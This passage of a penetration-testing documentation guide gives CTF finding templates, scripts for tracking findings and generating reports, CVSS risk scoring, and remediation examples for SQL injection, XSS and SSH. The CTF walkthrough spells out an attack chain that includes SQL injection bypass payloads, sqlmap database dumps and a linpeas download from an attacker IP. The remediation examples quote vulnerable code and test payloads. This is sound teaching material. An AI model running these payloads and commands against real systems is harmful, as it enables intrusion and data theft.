    print(f"Risk Score: {result['score']}")
    print(f"Risk Rating: {result['rating']}")
EOF

chmod +x risk_calculator.py

# Usage
python3 risk_calculator.py 3 4  # High likelihood, Critical impact = Critical risk
````

### CTF-Specific Finding Classification

````bash
# CTF Finding Template
cat > ctf_finding_template.md << 'EOF'
# CTF Finding Documentation

## Challenge Information
- **Challenge Name:** Web Exploitation 101
- **Category:** Web Application Security
- **Difficulty:** Medium
- **Points:** 500
- **Platform:** HackTheBox / TryHackMe / CTF Name

## Target Information
- **IP Address:** 10.10.11.123
- **Hostname:** webapp.htb
- **OS:** Linux (Ubuntu 20.04)
- **Open Ports:** 22 (SSH), 80 (HTTP), 443 (HTTPS)

## Vulnerability Summary
SQL Injection in login form leading to authentication bypass and database extraction.

## Discovery Process

### 1. Reconnaissance
```bash
# Port scan
nmap -sC -sV -oA nmap/initial 10.10.11.123

# Results:
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu
80/tcp  open  http     Apache httpd 2.4.41
443/tcp open  ssl/http Apache httpd 2.4.41
````

### 2. Enumeration

```bash
# Web enumeration
whatweb http://10.10.11.123
nikto -h http://10.10.11.123
gobuster dir -u http://10.10.11.123 -w /usr/share/wordlists/dirb/common.txt

# Found endpoints:
/login.php
/admin/
/config.php.bak (backup file!)
```

### 3. Exploitation

```bash
# Downloaded config backup
curl http://10.10.11.123/config.php.bak -o config.php.bak

# Revealed database credentials:
# DB_USER: webapp_user
# DB_PASS: P@ssw0rd123!
# DB_NAME: webapp_db

# SQL Injection testing
sqlmap -u "http://10.10.11.123/login.php" \
  --data="username=admin&password=test" \
  --level=5 --risk=3 --batch

# Manual exploitation
curl -X POST http://10.10.11.123/login.php \
  -d "username=admin' OR '1'='1'-- -&password=anything"

# Result: Authentication bypassed, admin access gained
```

### 4. Post-Exploitation

```bash
# Database enumeration
sqlmap -u "http://10.10.11.123/login.php" \
  --data="username=admin&password=test" \
  --dbs --batch

# Database dump
sqlmap -u "http://10.10.11.123/login.php" \
  --data="username=admin&password=test" \
  -D webapp_db --dump-all

# Found: SSH credentials in users table
# Username: admin
# Password: SuperSecretPassword456!
```

### 5. Privilege Escalation

```bash
# SSH access
ssh admin@10.10.11.123

# User flag
cat /home/admin/user.txt
# Flag: HTB{us3r_fl4g_h3r3}

# Privilege escalation enumeration
wget http://10.10.14.5:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Found: SUID binary /usr/bin/custom_backup
# Buffer overflow vulnerability identified

# Exploit development
python3 exploit.py
# Root shell obtained

# Root flag
cat /root/root.txt
# Flag: HTB{r00t_fl4g_h3r3}
```

## Flags Captured

1. **User Flag:** HTB{us3r_fl4g_h3r3}
    - Location: /home/admin/user.txt
    - Method: SQL Injection â†’ SSH access
2. **Root Flag:** HTB{r00t_fl4g_h3r3}
    - Location: /root/root.txt
    - Method: Buffer overflow in SUID binary

## Key Techniques Used

- [ ] Port scanning (nmap)
- [x] Web enumeration (gobuster, nikto)
- [x] SQL Injection (manual & sqlmap)
- [x] Credential harvesting
- [x] SSH access
- [x] Linux privilege escalation
- [x] Buffer overflow exploitation

## Tools Used

- nmap
- gobuster
- nikto
- sqlmap
- burp suite
- linpeas
- python3 (exploit development)

## Lessons Learned

1. Always check for backup files (.bak, .old, ~)
2. SQL injection can lead to complete compromise
3. Credentials in databases may grant access to other services
4. SUID binaries are common privilege escalation vectors

## Timeline

- 2025-10-26 13:00 - Started challenge
- 2025-10-26 13:30 - Initial enumeration complete
- 2025-10-26 14:15 - SQL injection discovered
- 2025-10-26 14:45 - User flag captured
- 2025-10-26 15:30 - Privilege escalation identified
- 2025-10-26 16:00 - Root flag captured
- **Total Time:** 3 hours

## Difficulty Assessment

**Rated Difficulty:** Medium **Actual Difficulty:** Medium

**Justification:**

- Straightforward SQL injection (standard technique)
- Clear privilege escalation path
- Well-documented exploitation methods
- Required basic binary exploitation knowledge

## Resources

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [GTFOBins](https://gtfobins.github.io/)
- [Linux Privilege Escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation) EOF

````

### Automated Finding Generation

```bash
# Create finding generator script
cat > generate_finding.sh << 'EOF'
#!/bin/bash
# Automated finding document generator

echo "=== Finding Generator ==="
read -p "Finding ID (e.g., F-001): " FINDING_ID
read -p "Title: " TITLE
read -p "Severity (Critical/High/Medium/Low): " SEVERITY
read -p "Category: " CATEGORY
read -p "Affected Host: " HOST
read -p "Affected Service: " SERVICE

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
FILENAME="findings/${FINDING_ID}_${TIMESTAMP}_$(echo $TITLE | tr ' ' '_' | tr '[:upper:]' '[:lower:]').md"

mkdir -p findings

cat > "$FILENAME" << FINDINGEOF
# ${FINDING_ID}: ${TITLE}

**Generated:** $(date)
**Severity:** ${SEVERITY}
**Category:** ${CATEGORY}

## Affected Asset
- **Host:** ${HOST}
- **Service:** ${SERVICE}

## Description
[Add detailed description here]

## Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]

## Proof of Concept
\`\`\`bash
# Add PoC commands here
\`\`\`

## Evidence
- Screenshots: screenshots/${TIMESTAMP}_*.png
- Logs: logs/${TIMESTAMP}_*.log

## Impact
**Technical Impact:**
- [Impact 1]

**Business Impact:**
- [Impact 1]

## Remediation
### Immediate Actions
1. [Action 1]

### Long-term Solutions
1. [Solution 1]

## References
- [Reference 1]

FINDINGEOF

echo "Finding document created: $FILENAME"
echo "Remember to:"
echo "  1. Add detailed description"
echo "  2. Document reproduction steps"
echo "  3. Include PoC code/commands"
echo "  4. Attach evidence (screenshots, logs)"
echo "  5. Specify remediation steps"
EOF

chmod +x generate_finding.sh
````

### Finding Database

```bash
# SQLite database for tracking findings
cat > create_findings_db.sql << 'EOF'
CREATE TABLE findings (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    finding_id TEXT UNIQUE NOT NULL,
    title TEXT NOT NULL,
    severity TEXT CHECK(severity IN ('Critical', 'High', 'Medium', 'Low', 'Informational')),
    category TEXT,
    cvss_score REAL,
    cvss_vector TEXT,
    affected_host TEXT,
    affected_service TEXT,
    description TEXT,
    impact TEXT,
    remediation TEXT,
    status TEXT CHECK(status IN ('Open', 'In Progress', 'Remediated', 'Accepted Risk', 'False Positive')),
    discovered_date TEXT,
    reported_date TEXT,
    remediated_date TEXT,
    discovered_by TEXT,
    validated_by TEXT
);

CREATE TABLE evidence (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    finding_id TEXT,
    evidence_type TEXT CHECK(evidence_type IN ('Screenshot', 'Log', 'PCAP', 'File', 'Other')),
    file_path TEXT,
    description TEXT,
    timestamp TEXT,
    FOREIGN KEY (finding_id) REFERENCES findings(finding_id)
);

CREATE TABLE remediation_tracking (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    finding_id TEXT,
    action TEXT,
    assigned_to TEXT,
    due_date TEXT,
    completed_date TEXT,
    notes TEXT,
    FOREIGN KEY (finding_id) REFERENCES findings(finding_id)
);

CREATE INDEX idx_severity ON findings(severity);
CREATE INDEX idx_status ON findings(status);
CREATE INDEX idx_finding_id ON evidence(finding_id);
EOF

sqlite3 findings.db < create_findings_db.sql

# Python script to manage findings database
cat > findings_manager.py << 'EOF'
#!/usr/bin/env python3
import sqlite3
import sys
from datetime import datetime

class FindingsManager:
    def __init__(self, db_path='findings.db'):
        self.conn = sqlite3.connect(db_path)
        self.cursor = self.conn.cursor()
    
    def add_finding(self, finding_id, title, severity, category, host, service, description):
        """Add new finding to database"""
        discovered_date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        try:
            self.cursor.execute('''
                INSERT INTO findings 
                (finding_id, title, severity, category, affected_host, affected_service, 
                 description, status, discovered_date, discovered_by)
                VALUES (?, ?, ?, ?, ?, ?, ?, 'Open', ?, ?)
            ''', (finding_id, title, severity, category, host, service, description, 
                  discovered_date, 'Operator'))
            
            self.conn.commit()
            print(f"âœ“ Finding {finding_id} added successfully")
            return True
        except sqlite3.IntegrityError:
            print(f"âœ— Error: Finding {finding_id} already exists")
            return False
    
    def add_evidence(self, finding_id, evidence_type, file_path, description):
        """Add evidence for a finding"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        self.cursor.execute('''
            INSERT INTO evidence (finding_id, evidence_type, file_path, description, timestamp)
            VALUES (?, ?, ?, ?, ?)
        ''', (finding_id, evidence_type, file_path, description, timestamp))
        
        self.conn.commit()
        print(f"âœ“ Evidence added to {finding_id}")
    
    def list_findings(self, severity=None, status=None):
        """List findings with optional filters"""
        query = "SELECT finding_id, title, severity, status, affected_host FROM findings WHERE 1=1"
        params = []
        
        if severity:
            query += " AND severity = ?"
            params.append(severity)
        
        if status:
            query += " AND status = ?"
            params.append(status)
        
        query += " ORDER BY CASE severity WHEN 'Critical' THEN 1 WHEN 'High' THEN 2 WHEN 'Medium' THEN 3 WHEN 'Low' THEN 4 ELSE 5 END"
        
        self.cursor.execute(query, params)
        results = self.cursor.fetchall()
        
        print(f"\n{'ID':<10} {'Title':<40} {'Severity':<10} {'Status':<15} {'Host':<20}")
        print("-" * 100)
        for row in results:
            print(f"{row[0]:<10} {row[1]:<40} {row[2]:<10} {row[3]:<15} {row[4]:<20}")
        print(f"\nTotal findings: {len(results)}\n")
    
    def get_finding_details(self, finding_id):
        """Get detailed information about a finding"""
        self.cursor.execute('SELECT * FROM findings WHERE finding_id = ?', (finding_id,))
        finding = self.cursor.fetchone()
        
        if not finding:
            print(f"Finding {finding_id} not found")
            return
        
        print(f"\n=== Finding Details: {finding_id} ===")
        print(f"Title: {finding[2]}")
        print(f"Severity: {finding[3]}")
        print(f"Category: {finding[4]}")
        print(f"CVSS Score: {finding[5]}")
        print(f"Affected Host: {finding[7]}")
        print(f"Affected Service: {finding[8]}")
        print(f"Status: {finding[12]}")
        print(f"Discovered: {finding[13]}")
        print(f"\nDescription:\n{finding[9]}")
        
        # Get associated evidence
        self.cursor.execute('SELECT evidence_type, file_path, description FROM evidence WHERE finding_id = ?', (finding_id,))
        evidence = self.cursor.fetchall()
        
        if evidence:
            print(f"\nEvidence ({len(evidence)} items):")
            for ev in evidence:
                print(f"  - [{ev[0]}] {ev[1]}: {ev[2]}")
    
    def update_status(self, finding_id, new_status):
        """Update finding status"""
        self.cursor.execute('UPDATE findings SET status = ? WHERE finding_id = ?', 
                          (new_status, finding_id))
        self.conn.commit()
        print(f"âœ“ Finding {finding_id} status updated to {new_status}")
    
    def generate_summary(self):
        """Generate summary statistics"""
        self.cursor.execute('''
            SELECT severity, COUNT(*) 
            FROM findings 
            GROUP BY severity 
            ORDER BY CASE severity WHEN 'Critical' THEN 1 WHEN 'High' THEN 2 WHEN 'Medium' THEN 3 WHEN 'Low' THEN 4 ELSE 5 END
        ''')
        severity_counts = self.cursor.fetchall()
        
        self.cursor.execute('''
            SELECT status, COUNT(*) 
            FROM findings 
            GROUP BY status
        ''')
        status_counts = self.cursor.fetchall()
        
        print("\n=== Findings Summary ===")
        print("\nBy Severity:")
        for sev, count in severity_counts:
            print(f"  {sev}: {count}")
        
        print("\nBy Status:")
        for stat, count in status_counts:
            print(f"  {stat}: {count}")
        
        self.cursor.execute('SELECT COUNT(*) FROM findings')
        total = self.cursor.fetchone()[0]
        print(f"\nTotal Findings: {total}\n")
    
    def close(self):
        self.conn.close()

def main():
    if len(sys.argv) < 2:
        print("Usage:")
        print("  findings_manager.py add <finding_id> <title> <severity> <category> <host> <service> <description>")
        print("  findings_manager.py list [severity] [status]")
        print("  findings_manager.py details <finding_id>")
        print("  findings_manager.py update <finding_id> <status>")
        print("  findings_manager.py summary")
        print("  findings_manager.py evidence <finding_id> <type> <path> <description>")
        sys.exit(1)
    
    manager = FindingsManager()
    command = sys.argv[1]
    
    if command == 'add' and len(sys.argv) >= 9:
        manager.add_finding(sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], 
                          sys.argv[6], sys.argv[7], sys.argv[8])
    elif command == 'list':
        severity = sys.argv[2] if len(sys.argv) > 2 else None
        status = sys.argv[3] if len(sys.argv) > 3 else None
        manager.list_findings(severity, status)
    elif command == 'details' and len(sys.argv) >= 3:
        manager.get_finding_details(sys.argv[2])
    elif command == 'update' and len(sys.argv) >= 4:
        manager.update_status(sys.argv[2], sys.argv[3])
    elif command == 'summary':
        manager.generate_summary()
    elif command == 'evidence' and len(sys.argv) >= 6:
        manager.add_evidence(sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5])
    else:
        print("Invalid command or missing arguments")
    
    manager.close()

if __name__ == '__main__':
    main()
EOF

chmod +x findings_manager.py

# Usage examples
python3 findings_manager.py add F-001 "SQL Injection in Login" Critical "Injection" "192.168.1.10" "Web App" "Authentication bypass via SQL injection"
python3 findings_manager.py evidence F-001 Screenshot "screenshots/20251026_145033_sqli.png" "Successful SQL injection"
python3 findings_manager.py list
python3 findings_manager.py summary
```

### Report Generation

```bash
# Markdown report generator
cat > generate_report.sh << 'EOF'
#!/bin/bash
# Generate final report from findings database

REPORT_DATE=$(date +%Y-%m-%d)
REPORT_FILE="reports/pentest_report_${REPORT_DATE}.md"

mkdir -p reports

cat > "$REPORT_FILE" << 'REPORT'
# Penetration Test Report

**Report Date:** $(date +"%B %d, %Y")
**Assessment Period:** October 20-26, 2025
**Prepared by:** Security Assessment Team
**Classification:** CONFIDENTIAL

---

## Executive Summary

This report presents the findings from a comprehensive penetration test conducted against [Target Organization/System]. The assessment identified [X] vulnerabilities across [Y] systems, with [Z] classified as Critical or High severity.

### Key Findings
- **Critical Findings:** X
- **High Findings:** Y
- **Medium Findings:** Z
- **Low Findings:** W
- **Informational:** V

### Risk Summary
The assessment revealed significant security concerns that require immediate attention. [Brief summary of most critical findings].

### Recommendations Priority
1. **Immediate (24-48 hours):** Address Critical findings
2. **Short-term (1-2 weeks):** Remediate High severity findings
3. **Medium-term (1 month):** Fix Medium severity issues
4. **Long-term (3 months):** Address Low and Informational findings

---

## Scope

### In-Scope Systems
- IP Range: 192.168.1.0/24
- Web Applications: http://webapp.target.com
- Network Services: All exposed services

### Out-of-Scope
- Production databases
- Customer-facing systems during business hours
- Social engineering attacks

### Methodology
- **Reconnaissance:** Network scanning, service enumeration
- **Vulnerability Assessment:** Automated and manual testing
- **Exploitation:** Proof-of-concept exploits (authorized)
- **Post-Exploitation:** Privilege escalation, lateral movement
- **Reporting:** Documentation of findings and remediation guidance

---

## Technical Findings

REPORT

# Add findings from database
sqlite3 findings.db << SQL
.mode markdown
.headers on
SELECT 
    finding_id as "ID",
    severity as "Severity", 
    title as "Title",
    affected_host as "Affected Host"
FROM findings
ORDER BY CASE severity 
    WHEN 'Critical' THEN 1 
    WHEN 'High' THEN 2 
    WHEN 'Medium' THEN 3 
    WHEN 'Low' THEN 4 
    ELSE 5 
END;
SQL

cat >> "$REPORT_FILE" << 'REPORT'

---

## Detailed Findings

[Individual finding details will be inserted here from findings database]

---

## Conclusion

This assessment identified several security vulnerabilities that pose risks to the organization. Immediate action is recommended for Critical and High severity findings.

### Overall Security Posture
[Assessment of overall security posture]

### Next Steps
1. Review and prioritize findings
2. Develop remediation plan
3. Implement fixes for Critical/High findings
4. Schedule retest after remediation

---

## Appendices

### Appendix A: Methodology Details
[Detailed methodology]

### Appendix B: Tools Used
- Nmap 7.94
- Metasploit Framework
- Burp Suite Professional
- SQLMap
- Custom scripts

### Appendix C: References
- OWASP Top 10 2021
- NIST Cybersecurity Framework
- CWE/SANS Top 25

REPORT

echo "Report generated: $REPORT_FILE"
echo "Next steps:"
echo "  1. Add detailed findings from findings/<finding_id>_*.md"
echo "  2. Review and edit executive summary"
echo "  3. Add evidence screenshots"
echo "  4. Generate PDF version"
EOF

chmod +x generate_report.sh
```

### Final Documentation Checklist

```bash
# Create checklist for report completion
cat > documentation_checklist.md << 'EOF'
# Documentation Checklist

## Evidence Collection
- [ ] All commands logged
- [ ] Screenshots captured for key findings
- [ ] Network traffic captured (PCAP files)
- [ ] Files and artifacts collected
- [ ] Hashes verified for collected files
- [ ] Credentials documented (encrypted)
- [ ] Exploit code preserved
- [ ] Database dumps saved

## Finding Documentation
- [ ] All vulnerabilities documented
- [ ] Severity ratings assigned
- [ ] CVSS scores calculated
- [ ] Reproduction steps documented
- [ ] Proof-of-concept code included
- [ ] Evidence linked to findings
- [ ] Impact assessments completed
- [ ] Remediation guidance provided

## Report Components
- [ ] Executive summary written
- [ ] Scope clearly defined
- [ ] Methodology documented
- [ ] Technical findings detailed
- [ ] Risk ratings justified
- [ ] Recommendations prioritized
- [ ] Appendices completed
- [ ] References cited

## Quality Assurance
- [ ] Peer review completed
- [ ] Technical accuracy verified
- [ ] Grammar and spelling checked
- [ ] Screenshots are clear and labeled
- [ ] All findings reproducible
- [ ] Code properly formatted
- [ ] File paths and commands accurate
- [ ] Sensitive data redacted/encrypted

## Deliverables
- [ ] Final report (PDF)
- [ ] Evidence package (encrypted archive)
- [ ] Executive presentation slides
- [ ] Remediation tracking spreadsheet
- [ ] Raw tool output (logs, scans)
- [ ] Clean working directory

## Post-Delivery
- [ ] Secure deletion of local copies
- [ ] Archive maintained per retention policy
- [ ] Credentials rotated (if applicable)
- [ ] Systems returned to original state
- [ ] Follow-up testing scheduled

EOF
```

## Important Related Topics

- **Professional Report Writing** (Structure, clarity, audience consideration) - Communicating technical findings effectively
- **Vulnerability Management** (Tracking, prioritization, remediation verification) - Managing findings lifecycle
- **Compliance Frameworks** (PCI-DSS, HIPAA, ISO 27001) - Mapping findings to regulatory requirements
- **Executive Communication** (Risk translation, business impact) - Presenting findings to non-technical stakeholders
- **Remediation Verification** (Retesting, validation) - Confirming vulnerabilities are properly fixed

---

## Risk Assessment

Risk assessment quantifies the likelihood and impact of vulnerabilities, prioritizing remediation efforts based on organizational risk tolerance.

### Risk Rating Methodologies

**CVSS (Common Vulnerability Scoring System) v3.1**

CVSS calculates risk scores (0-10) based on exploitability and impact metrics.

**Base Metrics**:

- **Attack Vector (AV)**: Network (N), Adjacent (A), Local (L), Physical (P)
- **Attack Complexity (AC)**: Low (L), High (H)
- **Privileges Required (PR)**: None (N), Low (L), High (H)
- **User Interaction (UI)**: None (N), Required (R)
- **Scope (S)**: Unchanged (U), Changed (C)
- **Confidentiality Impact (C)**: None (N), Low (L), High (H)
- **Integrity Impact (I)**: None (N), Low (L), High (H)
- **Availability Impact (A)**: None (N), Low (L), High (H)

**Example Calculation**:

```
SQL Injection in Public Web Application:
- AV:N (network accessible)
- AC:L (easily exploitable)
- PR:N (no authentication required)
- UI:N (no user interaction)
- S:C (can access database beyond web app scope)
- C:H (full database disclosure)
- I:H (data modification possible)
- A:H (database can be dropped)

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
Base Score: 10.0 (Critical)
```

**Severity Ratings**:

- **Critical**: 9.0-10.0
- **High**: 7.0-8.9
- **Medium**: 4.0-6.9
- **Low**: 0.1-3.9
- **Informational**: 0.0

**Custom Risk Matrix**

Organizations may use custom matrices combining likelihood and impact:

```
Impact â†’        Low         Medium      High        Critical
Likelihood â†“
Critical        Medium      High        Critical    Critical
High            Low         Medium      High        Critical
Medium          Low         Medium      High        High
Low             Info        Low         Medium      High
```

**Likelihood Assessment Factors**:

- Skill level required (script kiddie vs. expert)
- Access requirements (internet vs. physical)
- Exploit availability (public exploit exists)
- Attack surface exposure (number of vulnerable instances)
- Security controls in place (WAF, IDS, monitoring)

**Impact Assessment Factors**:

- Data sensitivity (PII, financial, health records)
- System criticality (production vs. development)
- Business impact (revenue loss, reputation damage)
- Compliance implications (GDPR, PCI-DSS, HIPAA)
- Potential for lateral movement

### Risk Scoring Examples

**Example 1: Unauthenticated Remote Code Execution**

```
Finding: Command Injection in Web API
Location: https://api.example.com/v1/system/ping

Technical Details:
- No authentication required
- Direct OS command execution via user input
- Internet-facing endpoint
- Affects production environment

CVSS Score: 10.0 (Critical)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

Risk Rating: CRITICAL

Justification:
- Likelihood: CRITICAL - Public exploit available, easily automated
- Impact: CRITICAL - Full system compromise, production data exposure
- Business Impact: Complete loss of confidentiality, integrity, and 
  availability. Potential for ransomware deployment, data exfiltration,
  and lateral movement to internal networks.
```

**Example 2: Information Disclosure**

```
Finding: Directory Listing Enabled
Location: https://website.example.com/backup/

Technical Details:
- Directory indexing reveals backup files
- Files contain source code and configuration
- No sensitive credentials found in reviewed files
- Development environment only

CVSS Score: 5.3 (Medium)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

Risk Rating: LOW

Justification:
- Likelihood: HIGH - Publicly accessible, requires no skill
- Impact: LOW - Development environment, no direct credential exposure
- Business Impact: Minimal. Source code disclosure may aid future 
  attacks but does not directly compromise production systems.
```

**Example 3: Privilege Escalation**

```
Finding: Sudo Misconfiguration - Privilege Escalation to Root
Location: /etc/sudoers on web-server-01

Technical Details:
- Standard user 'webadmin' can execute /usr/bin/vim as root without password
- GTFOBins technique allows shell escape to root
- Requires existing shell access as 'webadmin'
- Internal server, not directly accessible from internet

CVSS Score: 8.8 (High)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

Risk Rating: HIGH

Justification:
- Likelihood: MEDIUM - Requires initial foothold as 'webadmin' user
- Impact: CRITICAL - Complete system compromise, root access
- Business Impact: High. Attacker who compromises webadmin account 
  (via phishing, password reuse, etc.) immediately escalates to root,
  enabling persistence, data theft, and lateral movement.
```

### Risk Aggregation

**Vulnerability Chains**

[Inference] Multiple low/medium severity vulnerabilities may combine to create critical risk:

```
Chain Example: Authentication Bypass â†’ Data Exfiltration

1. Username Enumeration (Low)
   - CVSS: 5.3
   - Valid usernames disclosed via timing attack

2. Weak Password Policy (Info)
   - No complexity requirements
   - No account lockout

3. Credential Stuffing Attack (Medium)
   - CVSS: 6.5
   - Successful authentication with leaked passwords

4. Insecure Direct Object Reference (High)
   - CVSS: 8.1
   - Access any user data by modifying ID parameter

Combined Risk Rating: CRITICAL

Impact: Complete unauthorized access to all user data through 
exploitable vulnerability chain. Individual findings are medium 
severity, but combined create critical business risk.
```

**Risk Heatmap Generation**

```python
#!/usr/bin/env python3
import matplotlib.pyplot as plt
import numpy as np

# Vulnerability data: (likelihood, impact, title)
vulnerabilities = [
    (5, 5, "RCE in API"),
    (4, 5, "SQL Injection"),
    (5, 3, "XSS in Admin Panel"),
    (3, 4, "Privilege Escalation"),
    (2, 2, "Directory Listing"),
    (1, 1, "Version Disclosure"),
]

# Create heatmap
fig, ax = plt.subplots(figsize=(10, 8))

# Plot vulnerabilities
for likelihood, impact, title in vulnerabilities:
    color = 'red' if likelihood >= 4 and impact >= 4 else \
            'orange' if likelihood >= 3 or impact >= 3 else \
            'yellow' if likelihood >= 2 or impact >= 2 else 'green'
    ax.scatter(likelihood, impact, s=500, c=color, alpha=0.6, edgecolors='black')
    ax.annotate(title, (likelihood, impact), ha='center', va='center', fontsize=8)

# Configure axes
ax.set_xlim(0, 6)
ax.set_ylim(0, 6)
ax.set_xlabel('Likelihood', fontsize=12)
ax.set_ylabel('Impact', fontsize=12)
ax.set_title('Vulnerability Risk Heatmap', fontsize=14, fontweight='bold')
ax.grid(True, alpha=0.3)

# Add risk zones
ax.axhspan(4, 6, alpha=0.1, color='red')
ax.axvspan(4, 6, alpha=0.1, color='red')

plt.savefig('risk_heatmap.png', dpi=300, bbox_inches='tight')
```

### Business Impact Analysis

**Financial Impact Estimation**

```
Formula Components:
- Data Breach Cost: $X per record (industry average: $150/record)
- Downtime Cost: Revenue per hour Ã— Hours down
- Recovery Cost: Incident response + Remediation
- Regulatory Fines: Based on compliance framework
- Reputation Damage: Customer churn, brand devaluation

Example Calculation:
Finding: Unencrypted Database Backup Exposed

Scenario: Unauthorized access to 100,000 customer records
- Data breach cost: 100,000 records Ã— $150 = $15,000,000
- Regulatory fine (GDPR): Up to 4% annual revenue or â‚¬20M
- Legal fees: $500,000 - $2,000,000
- Customer notification: $0.50 per customer = $50,000
- Credit monitoring (2 years): $20/customer/year = $4,000,000
- Reputation damage: 15% customer churn = $5,000,000 lost revenue

Total Estimated Impact: $24,550,000 - $26,050,000
```

**Compliance Risk Assessment**

```
Framework: PCI-DSS Requirement 6.5.1 (Injection Flaws)

Finding: SQL Injection in Payment Processing
Non-Compliance Risk: CRITICAL

Implications:
- PCI-DSS violation (Requirement 6.5)
- Potential loss of merchant account
- Quarterly audit failures
- Payment processor penalties
- Forensic investigation costs (post-breach)
- Level 1 merchant re-certification costs: $50,000-$200,000

Recommendation: Immediate remediation required before next quarterly scan.
Failure to remediate may result in suspension of card processing capabilities.
```

## Remediation Recommendations

Remediation recommendations provide specific, actionable guidance to eliminate or mitigate identified vulnerabilities.

### Recommendation Structure

**Effective Recommendation Template**:

```markdown
## [Vulnerability ID]: [Vulnerability Name]

### Short-Term Remediation (Immediate - 0-30 days)
[Quick fixes, workarounds, or compensating controls]

### Long-Term Remediation (Strategic - 30-90 days)
[Permanent fixes, architectural changes, process improvements]

### Verification Steps
[How to confirm the fix is effective]

### Code Example / Configuration
[Specific implementation guidance with before/after examples]

### References
[Links to vendor documentation, OWASP guidance, CVE details]
```

### Code-Level Remediation Examples

**SQL Injection Remediation**

````markdown
Finding: SQL Injection in User Search Function

Current Vulnerable Code (Python Flask):
```python
@app.route('/search')
def search():
    username = request.args.get('username')
    query = f"SELECT * FROM users WHERE username = '{username}'"
    results = db.execute(query)
    return render_template('results.html', results=results)
````

Remediated Code (Parameterized Query):

```python
@app.route('/search')
def search():
    username = request.args.get('username')
    # Use parameterized query to prevent SQL injection
    query = "SELECT * FROM users WHERE username = ?"
    results = db.execute(query, (username,))
    return render_template('results.html', results=results)
```

Alternative: Using ORM (SQLAlchemy):

```python
@app.route('/search')
def search():
    username = request.args.get('username')
    # ORM automatically handles parameterization
    results = User.query.filter_by(username=username).all()
    return render_template('results.html', results=results)
```

Verification:

1. Test with payload: `admin' OR '1'='1`
2. Confirm query returns only exact username matches
3. Check application logs for SQL errors
4. Run automated SQLMap scan: `sqlmap -u "http://target/search?username=test" --batch`

References:

- OWASP SQL Injection Prevention Cheat Sheet
- CWE-89: SQL Injection
- Flask-SQLAlchemy Documentation

````

**XSS (Cross-Site Scripting) Remediation**

```markdown
Finding: Reflected XSS in Search Results

Current Vulnerable Code (PHP):
```php
<?php
$search = $_GET['q'];
echo "<h2>Search results for: " . $search . "</h2>";
?>
````

Remediated Code (Output Encoding):

```php
<?php
$search = $_GET['q'];
// HTML entity encoding prevents XSS
echo "<h2>Search results for: " . htmlspecialchars($search, ENT_QUOTES, 'UTF-8') . "</h2>";
?>
```

Content Security Policy Header (Defense in Depth):

```apache
# Add to .htaccess or web server config
Header set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'"
```

Modern Framework Approach (React):

```javascript
// React automatically escapes values
function SearchResults({ query }) {
    return <h2>Search results for: {query}</h2>;
    // No manual encoding needed - React handles it
}
```

Verification:

1. Test payload: `<script>alert('XSS')</script>`
2. Confirm output is HTML-encoded: `&lt;script&gt;alert('XSS')&lt;/script&gt;`
3. Verify CSP header present: `curl -I https://target/search?q=test`
4. Run automated XSS scanner: `xssstrike -u "https://target/search?q=FUZZ"`

References:

- OWASP XSS Prevention Cheat Sheet
- CWE-79: Cross-Site Scripting
- Content Security Policy Reference

````

### Configuration Remediation Examples

**Insecure SSH Configuration**

```markdown
Finding: Weak SSH Configuration

Current Configuration (/etc/ssh/sshd_config):
```bash
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords yes
Protocol 1,2
````

Hardened Configuration:

```bash
# Disable root login
PermitRootLogin no

# Use key-based authentication only
PasswordAuthentication no
PubkeyAuthentication yes

# Disable empty passwords
PermitEmptyPasswords no

# Use Protocol 2 only (Protocol 1 is deprecated)
Protocol 2

# Limit authentication attempts
MaxAuthTries 3

# Set idle timeout
ClientAliveInterval 300
ClientAliveCountMax 2

# Disable X11 forwarding if not needed
X11Forwarding no

# Use strong ciphers only
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group16-sha512

# Allow specific users only
AllowUsers admin operator
```

Implementation Steps:

```bash
# 1. Backup current configuration
sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup.$(date +%Y%m%d)

# 2. Apply hardened configuration
sudo nano /etc/ssh/sshd_config
# (paste hardened config)

# 3. Test configuration syntax
sudo sshd -t

# 4. Ensure you have alternative access (console, IPMI)
# CRITICAL: Do not proceed without backup access!

# 5. Restart SSH service
sudo systemctl restart sshd

# 6. Test login from new session (keep current session open)
ssh user@server
```

Verification:

```bash
# Check configuration
sudo sshd -T | grep -E "permitrootlogin|passwordauthentication"

# Test from external scanner
nmap --script ssh2-enum-algos -p 22 target

# Expected: Only strong ciphers/MACs listed
```

References:

- Mozilla SSH Guidelines
- CIS Benchmark for OpenSSH
- NIST SP 800-52r2

````

**Database Security Hardening**

```markdown
Finding: MySQL Running with Excessive Privileges

Current State:
- MySQL running as root user
- Remote root login enabled
- Anonymous accounts present
- Test database accessible

Remediation Steps:

1. Create Dedicated MySQL User (Linux):
```bash
# Create mysql system user if not exists
sudo useradd -r -s /bin/false mysql

# Change ownership of MySQL data directory
sudo chown -R mysql:mysql /var/lib/mysql

# Update MySQL systemd service
sudo nano /etc/systemd/system/mysql.service
# Add: User=mysql
# Add: Group=mysql

sudo systemctl daemon-reload
